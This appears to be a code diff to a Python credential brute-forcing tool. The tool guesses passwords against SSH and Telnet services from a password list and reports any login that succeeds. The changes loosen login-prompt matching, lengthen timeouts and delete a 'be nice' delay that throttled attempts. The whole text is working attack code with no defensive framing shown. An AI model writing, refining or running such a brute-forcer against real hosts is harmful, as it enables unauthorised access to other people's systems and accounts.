@@ -24,13 +24,9 @@ def brute_force_ssh(target, username, password_list, port=22):
             # results.append({"status": "fail", "password": password, "message": "Authentication failed"})
             pass
         except Exception as e:
-            if "Error reading SSH protocol banner" in str(e):
-                 # results.append({"status": "error", "password": password, "message": f"Connection Error: {str(e)}"})
-                 pass
-            else:
-                 # results.append({"status": "error", "password": password, "message": f"Error: {str(e)}"})
-                 pass
-            time.sleep(0.1) # Be nice
+            # Log connection errors for debugging
+            print(f"[ERROR] SSH Connection failed: {e}")
+            pass
             
     client.close()
     if not results:
@@ -38,54 +34,51 @@ def brute_force_ssh(target, username, password_list, port=22):
         
     return results
 
-async def attempt_telnet_login(target, port, username, password):
+async def telnet_login_check(target, port, username, password):
     try:
         reader, writer = await asyncio.wait_for(telnetlib3.open_connection(target, port), timeout=5)
         
-        # Read until login prompt
-        await asyncio.wait_for(reader.readuntil("login: "), timeout=3)
+        # Read initial banner until login prompt
+        # Note: Prompts vary, some systems send "Login:" others "login:"
+        await asyncio.wait_for(reader.readuntil("ogin:"), timeout=5) 
         writer.write(username + "\n")
         
-        # Read until password prompt
-        await asyncio.wait_for(reader.readuntil("Password: "), timeout=3)
+        # Read until password
+        await asyncio.wait_for(reader.readuntil("assword:"), timeout=5)
         writer.write(password + "\n")
         
-        # Read response to check for success
-        # Note: telnetlib3 might return different encoding, usually strings.
-        response = await asyncio.wait_for(reader.read(1024), timeout=3)
+        # Check result
+        # Read a bit to see if we get a shell prompt or error
+        response = await asyncio.wait_for(reader.read(1024), timeout=5)
         
         writer.close()
         
         if "Login incorrect" not in response and "failed" not in response:
-            return True, None
-        return False, None
-        
+            return True
+        return False
     except Exception as e:
-        return False, str(e)
+        # print(f"Telnet Error: {e}")
+        return False
 
 def brute_force_telnet(target, username, password_list, port=23):
     results = []
     
-    # Run the async loop for each password (simple approach) or batch them
-    # For now, keeping it sequential to match previous logic's style
-    
     for password in password_list:
         password = password.strip()
         try:
-             # Run single attempt synchronously
-             success, error = asyncio.run(attempt_telnet_login(target, port, username, password))
-             
-             if success:
+            # Create a new event loop for each attempt to avoid "loop is closed" issues in this sync function context
+            # Or just use asyncio.run which handles a fresh loop
+            is_success = asyncio.run(telnet_login_check(target, port, username, password))
+            
+            if is_success:
                  success_msg = f"[SUCCESS] Found password for {username}@{target}: {password}"
                  results.append({"status": "success", "password": password, "message": success_msg})
                  return results
                  
         except Exception as e:
+            print(f"Telnet Attempt Error: {e}")
             pass
             
-    if not results:
-        results.append({"status": "fail", "message": f"No password found for {username} in provided list."})
-        
     if not results:
         results.append({"status": "fail", "message": f"No password found for {username} in provided list."})
         
